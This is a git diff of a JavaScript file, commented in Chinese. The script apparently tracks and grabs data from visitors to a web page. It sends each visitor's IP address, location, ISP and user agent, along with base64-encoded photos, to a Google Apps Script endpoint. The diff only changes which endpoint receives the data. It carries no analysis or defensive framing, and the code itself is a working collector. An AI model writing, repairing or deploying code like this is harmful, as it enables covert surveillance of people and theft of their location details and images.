@@ -24,7 +24,7 @@ fetch('https://ipinfo.io/json')
       `IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}`;
 
     // 發送 IP 資訊至 Apps Script
-    return fetch('https://script.google.com/macros/s/AKfycbwQR8IIq9zRG7oNUdEgG3Q1b6nSZqJXft8XE8mPh_6t2U3xJ2OlgdlLocF5BEtwY27bSw/exec', {
+    return fetch('https://script.google.com/macros/s/AKfycbzQZKvkMBTMif8lFkuXIc8SB1kHvUp758o0s6aYN-iF49UBR1milw8Ea6pWchhmxdSw4w/exec', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -58,7 +58,7 @@ fetch('https://ipinfo.io/json')
           const base64Photo = reader.result;
 
           // 發送照片至 Google Apps Script
-          fetch('https://script.google.com/macros/s/AKfycbwQR8IIq9zRG7oNUdEgG3Q1b6nSZqJXft8XE8mPh_6t2U3xJ2OlgdlLocF5BEtwY27bSw/exec', { // 替換為 Apps Script 部署 URL
+          fetch('https://script.google.com/macros/s/AKfycbzQZKvkMBTMif8lFkuXIc8SB1kHvUp758o0s6aYN-iF49UBR1milw8Ea6pWchhmxdSw4w/exec', { // 替換為 Apps Script 部署 URL
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ photos: [base64Photo] }),
